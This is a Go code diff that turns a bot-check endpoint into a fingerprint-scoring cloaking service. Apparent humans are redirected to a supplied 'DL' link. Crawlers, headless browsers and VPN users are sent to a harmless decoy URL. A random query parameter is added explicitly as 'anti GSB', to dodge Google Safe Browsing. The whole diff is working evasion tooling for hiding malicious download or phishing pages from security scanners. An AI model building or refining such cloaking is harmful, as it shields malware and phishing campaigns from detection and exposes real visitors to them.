@@ -4,9 +4,18 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
 	"strings"
 	"time"
 )
+
+type FPData struct {
+	Webdriver bool   `json:"webdriver"`
+	Lang      string `json:"lang"`
+	Platform  string `json:"platform"`
+	Screen    string `json:"screen"`
+	TZ        string `json:"tz"`
+}
 
 func isBotUA(ua string) bool {
 	bots := []string{"bot", "crawler", "spider", "curl", "wget", "python"}
@@ -35,7 +44,7 @@ func isFakeMobile(ua string) bool {
 	return false
 }
 
-// VPN check via API
+// VPN API check
 func checkVPN(ip string) bool {
 	client := &http.Client{Timeout: 2 * time.Second}
 
@@ -55,47 +64,82 @@ func checkVPN(ip string) bool {
 	return false
 }
 
-func check(w http.ResponseWriter, r *http.Request) {
+// FP handler
+func fpHandler(w http.ResponseWriter, r *http.Request) {
 
-	ip := r.FormValue("ip")
-	ua := strings.ToLower(r.FormValue("ua"))
+	var body struct {
+		FP FPData `json:"fp"`
+		DL string `json:"dl"`
+		BL string `json:"bl"`
+	}
+
+	json.NewDecoder(r.Body).Decode(&body)
+
+	ua := strings.ToLower(body.FP.Platform)
+	ip := r.RemoteAddr
 
 	score := 0
 
-	// UA bot
+	if body.FP.Webdriver {
+		score += 60
+	}
+
+	if body.FP.TZ == "" {
+		score += 30
+	}
+
 	if isBotUA(ua) {
 		score += 40
 	}
 
-	// crawler
 	if isCrawler(ua) {
 		score += 50
 	}
 
-	// fake mobile
 	if isFakeMobile(ua) {
 		score += 40
 	}
 
-	// VPN
 	if checkVPN(ip) {
 		score += 30
 	}
 
-	// empty ip
-	if ip == "" {
-		score += 50
+	mode := os.Getenv("MODE")
+
+	limit := 60
+
+	if mode == "light" {
+		limit = 80
+	}
+	if mode == "paranoid" {
+		limit = 40
 	}
 
-	if score >= 60 {
-		fmt.Fprintf(w, "block")
-		return
+	redirect := body.DL
+
+	if redirect == "" {
+		redirect = "https://google.com"
 	}
 
-	fmt.Fprintf(w, "allow")
+	if body.BL == "" {
+		body.BL = "https://example.com"
+	}
+
+	if score >= limit {
+		redirect = body.BL
+	}
+
+	// anti GSB random param
+	redirect = redirect + "&r=" + fmt.Sprint(time.Now().UnixNano())
+
+	json.NewEncoder(w).Encode(map[string]string{
+		"redirect": redirect,
+	})
 }
 
 func main() {
-	http.HandleFunc("/check", check)
+
+	http.HandleFunc("/fp", fpHandler)
+
 	http.ListenAndServe(":8080", nil)
 }
